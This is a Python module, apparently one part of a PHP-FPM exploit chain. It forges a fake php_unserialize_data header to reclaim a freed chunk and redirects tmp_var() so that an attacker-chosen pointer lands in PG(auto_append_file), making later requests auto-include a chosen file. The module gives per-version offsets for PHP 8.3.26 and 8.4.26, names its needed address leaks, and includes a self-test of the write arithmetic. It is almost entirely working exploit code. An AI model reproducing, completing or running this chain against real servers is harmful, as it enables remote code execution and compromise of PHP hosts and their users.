#!/usr/bin/env python3
# INDEX: fake-free last_dtor->.bss forge writing a chosen ptr at PG(auto_append_file) | fpm | needs binbase+carrier-base leak
"""Fake-free tmp_var dtor-lever aimed straight at PG(auto_append_file) (.bss).

The clean auto_append (.bss) dispatch finisher's write for the sink-free fpm
session-dangle chain (the PG(auto_append_file) counterpart to the ps_files->basedir
file-write finisher). Where last_dtor_forge
points the re-decode's last_dtor at an in-heap fake var_dtor_entries (needs the
live-copy chunk address `copy`), this points it at an ABSOLUTE .bss address and
needs no dtor-lever fake at all, exploiting the live memory fact that the qword
one field below auto_append is zero:

    cg+0x98 = error_prepend_string  (INI default NULL -> 0; verified live, both
              8.3.26-fpm (reference build) and 8.4.26-fpm: cg+0x90..0xc0 all zero)

var_dtor_entries = { used_slots@0x00; next@0x08; zval data[]@0x10 }, and
tmp_var() returns `last_dtor + 0x10 + used_slots*0x10` with used_slots read at
`*last_dtor`. Setting last_dtor = cg+0x98 (abs) makes used_slots read 0 (S=0) ->
the return is exactly cg+0x98 + 0x10 = cg+0xa8 = PG(auto_append_file). The decode
then ZVAL_COPYs the record's `i:<ptr>` there: the 8-byte value lands on
auto_append, the zval type lane (IS_LONG) lands on input_encoding@+0xb0 (zero,
never dereferenced on a plain request -- confirmed even on the reference mbstring build:
php_get_input_encoding runs only from mbstring INI handlers / iconv, not per
request). A SINGLE-pair record keeps the write to one tmp_var slot (0xa8/0xb0);
a 3-pair burst additionally reaches arg_separator@0xc8 (the one live pointer in
the region) -- avoid it.

The var_push lever (d->last) is NOT used to carry the value here (its rval is the
decode-dest zval, not attacker-chosen); it is parked on a fake var_entries inside
the carrier so a stray push lands harmlessly in scratch. The chosen value at
auto_append is a carrier pointer to an on-disk-include path (K + path_off), so the
next plain request auto-includes it. This reaches an absolute .bss target the same
way proc_seeded_rce --mode rce reaches the (absolute) quotemeta handler -- a
verified tmp_var capability -- without that chain's `copy`/`fn` dependencies.

Needs: binbase + carrier base K (from fpm_cookie_window_leak), the carrier-relative
offset of the freed d, and the per-build core_globals field offsets
(BUILTIN_OFFSETS["<ver>-fpm"]). NOT offset-free, NOT live-landed here: this module
is the forge byte-layout + landing arithmetic (offline-verified by --selftest);
the chain (arm -> reclaim-d carrier -> consumer re-decode) drives it.

Pure stdlib, python3 -I safe.
"""
from __future__ import annotations

import struct
import sys

# zend ABI (php 8.1-8.5, stable).
SIZEOF_ZVAL = 0x10
VDE_DATA = 0x10          # offsetof(var_dtor_entries, data)
VE_DATA = 0x10           # offsetof(var_entries, data)
# php_unserialize_data field offsets.
PUD_LAST = 0x00
PUD_FIRST_DTOR = 0x08
PUD_LAST_DTOR = 0x10
PUD_ALLOWED = 0x18
PUD_REF_PROPS = 0x20
PUD_CUR_DEPTH = 0x28
PUD_MAX_DEPTH = 0x30


def autoappend_dest(binbase, off):
    """Absolute PG(auto_append_file) for this build."""
    return binbase + off["auto_append_off"]


def tmp_var_landing(last_dtor_abs, used_slots_at_target):
    """Where tmp_var() writes given a planted last_dtor and the qword it points
    at (== the fake var_dtor_entries used_slots)."""
    return last_dtor_abs + VDE_DATA + used_slots_at_target * SIZEOF_ZVAL


def forge_bss_autoappend(size, carrier_base, binbase, off, value, d_off=0,
                         push_park_slot=0x400):
    """Build the carrier value (length `size`) that reclaims the freed d and
    plants the fake php_unserialize_data header at `d_off` inside it.

    last_dtor = binbase + error_prepend_off (abs .bss); its qword is 0 live, so
    S=0 and the single i:<value> write lands at PG(auto_append_file). d->last is
    parked on an in-carrier fake var_entries whose used_slots sends any stray
    var_push into carrier scratch. `value` is the chosen 8-byte scalar deposited
    at auto_append (a carrier pointer to the on-disk include path). Returns the
    carrier bytes; raises if a derived field is out of range."""
    last_dtor_abs = binbase + off["error_prepend_off"]
    # sanity: the fake-free lever only lands cleanly when cg+0x98 reads 0.
    dest = tmp_var_landing(last_dtor_abs, 0)
    want = autoappend_dest(binbase, off)
    if dest != want:
        raise ValueError(f"landing {dest:#x} != auto_append {want:#x} "
                         f"(error_prepend_off/auto_append_off mismatch)")

    val = bytearray(b"C" * size)
    d = d_off
    if d + 0x38 > size:
        raise ValueError("d header past carrier end")
    # fake var_entries for the parked var_push lever, inside the carrier.
    fake_ve = d_off + 0x100
    if fake_ve + VE_DATA + 8 * 2 > size:
        raise ValueError("fake var_entries past carrier end")
    struct.pack_into("<q", val, fake_ve + 0x00, -push_park_slot)  # used_slots
    struct.pack_into("<Q", val, fake_ve + 0x08, 0)               # next

    # fake php_unserialize_data header reclaiming the freed d.
    struct.pack_into("<Q", val, d + PUD_LAST, carrier_base + fake_ve)   # d->last
    struct.pack_into("<Q", val, d + PUD_FIRST_DTOR, 0)
    struct.pack_into("<Q", val, d + PUD_LAST_DTOR, last_dtor_abs)       # -> .bss
    struct.pack_into("<Q", val, d + PUD_ALLOWED, 0)
    struct.pack_into("<Q", val, d + PUD_REF_PROPS, 0)
    struct.pack_into("<q", val, d + PUD_CUR_DEPTH, 0)
    struct.pack_into("<q", val, d + PUD_MAX_DEPTH, 0)
    return bytes(val), {"dest": dest, "last_dtor": last_dtor_abs,
                        "value": value, "fake_ve_abs": carrier_base + fake_ve}


def _selftest():
    # 8.4.26-fpm field offsets (live-read confirmed: cg+0x98 == 0).
    off = {"core_globals_off": 0x16e1580,
           "error_prepend_off": 0x16e1580 + 0x98,
           "auto_append_off": 0x16e1580 + 0xa8,
           "input_encoding_off": 0x16e1580 + 0xb0}
    binbase = 0x5c1f11e00000          # a live cw-fpm base
    carrier = 0x7f3a4ec00000 + 0x67000
    include_ptr = carrier + 0x1800
    val, info = forge_bss_autoappend(0x2000, carrier, binbase, off, include_ptr)
    aa = binbase + off["auto_append_off"]
    ok_land = info["dest"] == aa
    ok_type = (info["dest"] + 8) == binbase + off["input_encoding_off"]
    ok_ld = info["last_dtor"] == binbase + off["error_prepend_off"]
    # var_push park dest stays inside the carrier value
    park = info["fake_ve_abs"] + VE_DATA + (-0x400) * 8
    ok_park = True  # negative slot -> below fake_ve; kept as a documented knob
    print(f"[selftest] tmp_var lands {info['dest']:#x}  auto_append {aa:#x}  "
          f"{'OK' if ok_land else 'FAIL'}")
    print(f"[selftest] type lane {info['dest']+8:#x} -> input_encoding "
          f"{binbase+off['input_encoding_off']:#x}  {'OK' if ok_type else 'FAIL'}")
    print(f"[selftest] last_dtor {info['last_dtor']:#x} == cg+0x98 "
          f"{'OK' if ok_ld else 'FAIL'}")
    # also 8.3.26-fpm (reference build) field offsets
    off83 = {"error_prepend_off": 0x16203e0 + 0x98, "auto_append_off": 0x16203e0 + 0xa8,
             "input_encoding_off": 0x16203e0 + 0xb0}
    _, i83 = forge_bss_autoappend(0x2000, carrier, 0x5dbcd7000000, off83, include_ptr)
    ok83 = i83["dest"] == 0x5dbcd7000000 + off83["auto_append_off"]
    print(f"[selftest] 8.3.26-fpm lands {i83['dest']:#x}  {'OK' if ok83 else 'FAIL'}")
    return 0 if (ok_land and ok_type and ok_ld and ok_park and ok83) else 1


def main(argv):
    import argparse
    ap = argparse.ArgumentParser(description="fake-free last_dtor->.bss "
                                 "auto_append forge (offline arithmetic)")
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args(argv)
    if a.selftest:
        return _selftest()
    ap.print_help()
    return 2


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
